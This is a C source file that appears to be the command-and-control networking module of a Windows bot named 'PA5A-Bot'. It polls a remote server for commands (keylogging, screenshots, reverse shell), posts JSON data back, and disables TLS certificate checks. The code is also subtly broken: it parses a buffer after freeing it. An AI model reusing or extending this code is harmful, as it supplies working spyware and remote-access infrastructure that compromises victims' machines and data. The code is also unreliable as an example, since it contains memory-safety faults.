#include "pa5a.hpp"

EXTERN_C_START

VOID GenerateBoundary(LPSTR buffer, SIZE_T size)
{
	char chaine[] = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int max = strlen(chaine);
	UINT i = 0;

	for (i = 0; i < size; i++)
		buffer[i] = chaine[rand() % (max - 1)];

	buffer[i] = 0;
}
/********************************************************************************************************************************************************/
Commands GetCommands(LPCSTR server, DWORD port)
{
	HINTERNET hSession, hConnect, hRequest;
	LPCSTR acceptTypes[] = {"text/*", NULL};
	Commands commands = { 0 };

	//Construction de l'url
	CHAR url[URL_SIZE] = { 0 };
	CHAR uuid[UUID_SIZE] = { 0 };
	GetUuid(uuid);

	if (StringCbPrintfA(url, sizeof(url), "%s%s%s", CLIENT_API_A, uuid, COMMANDS_API_A) != S_OK)
		return commands;

	if ((hSession = InternetOpenA("PA5A-Bot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0)) == NULL)
	{
		return commands;
	}

	if ((hConnect = InternetConnectA(hSession, server, (INTERNET_PORT)port, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL)) == NULL)
	{
		InternetCloseHandle(hSession);
		return commands;
	}
	if ((hRequest = HttpOpenRequestA(hConnect, "GET", url, NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE, 1)) == NULL)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return commands;
	}

	DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
	if(InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags)) == FALSE)
		return commands;

	if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return commands;
	}

	//Get response
	//Headers
	CHAR headerBuffer[8192] = { 0 };
	DWORD headerSize = sizeof(headerBuffer);

	if (HttpQueryInfoA(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, (LPVOID)headerBuffer, &headerSize, 0) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return commands;
	}

	//Print headers
	printf("----- RESPONSE ----\n");
	printf("Headers length = %d\n", headerSize);
	printf("|%s|\n", headerBuffer);

	//(Get the data)
	LPSTR dataBuffer = NULL;
	DWORD dataSize = 0;

	if (InternetQueryDataAvailable(hRequest, &dataSize, 0, 0) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return commands;
	}

	printf("Data length = %d\n", dataSize);
	if ((dataBuffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (dataSize + 2) * sizeof(CHAR))) == NULL)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return commands;
	}

	if (InternetReadFile(hRequest, (LPVOID)dataBuffer, dataSize + 1, &dataSize) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return commands;
	}

	printf("|%s|\n", dataBuffer);

	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, (LPVOID)dataBuffer);

	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);


	cJSON* commandsArray = NULL;
	if ((commandsArray = cJSON_Parse((LPCSTR)dataBuffer)) == NULL)
		return commands;

	DWORD commandsNumber = 0;
	if (cJSON_IsArray(commandsArray) == FALSE)
		return commands;

	commandsNumber = cJSON_GetArraySize(commandsArray);


	printf("Number of command = %d\n\n", commandsNumber);

	for (DWORD i = 0; i < commandsNumber; i++)
	{
		cJSON* command = NULL;
		if ((command = cJSON_GetArrayItem(commandsArray, i)) == NULL || command->valuestring == NULL)
			continue;

		if (!strcmp(command->valuestring, "KEYLOGS"))
			commands.keylogs = TRUE;
		else if (!strcmp(command->valuestring, "SCREENSHOT"))
			commands.screenshot = TRUE;
		else if (!strcmp(command->valuestring, "REVERSE-SHELL"))
			commands.reverseShell = TRUE;

		printf("Command number %d is %s\n", i, command->valuestring);

		//cJSON_Delete(command);
	}
	
	cJSON_Delete(commandsArray);

	return commands;
}
/********************************************************************************************************************************************************/
BOOL SendJsonDataByHttps(LPCSTR server, DWORD port, LPCSTR url, LPCSTR method, LPCSTR userAgent, LPCSTR jsonData)
{
	HINTERNET hSession, hConnect, hRequest;
	LPCSTR header = "Content-Type: application/json";

	if ((hSession = InternetOpenA(userAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0)) == NULL)
	{
		return FALSE;
	}
	if ((hConnect = InternetConnectA(hSession, server, (INTERNET_PORT)port, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL)) == NULL)
	{
		InternetCloseHandle(hSession);
		return FALSE;
	}
	if ((hRequest = HttpOpenRequestA(hConnect, method, url, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 1)) == NULL)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}

	DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
	if (InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags)) == FALSE)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}

	if (HttpSendRequestA(hRequest, header, strlen(header), (LPVOID)jsonData, strlen(jsonData)) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}
	
	//Get response
	//Headers
	CHAR headerBuffer[8192] = {0};
	DWORD headerSize = sizeof(headerBuffer);
	DWORD headerNumber = 0;
	
	if (HttpQueryInfoA(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, (LPVOID)headerBuffer, &headerSize, &headerNumber) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}
	
	//Print headers
	printf("----- RESPONSE ----\n");
	printf("Headers length = %d\n", headerSize);
	printf("|%s|\n", headerBuffer);

	//(Get the data)
	LPSTR dataBuffer = NULL;
	DWORD dataSize = 0;
	
	if (InternetQueryDataAvailable(hRequest, &dataSize, 0, 0) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}
	
	printf("Data length = %d\n", dataSize);
	if ((dataBuffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (dataSize + 2) * sizeof(BYTE))) == NULL)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}
	
	if (InternetReadFile(hRequest, (LPVOID)dataBuffer, dataSize + 1, &dataSize) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}

	printf("|%s|\n", dataBuffer);

	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, (LPVOID)dataBuffer);
	
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);

	return TRUE;
}
/********************************************************************************************************************************************************/

EXTERN_C_END
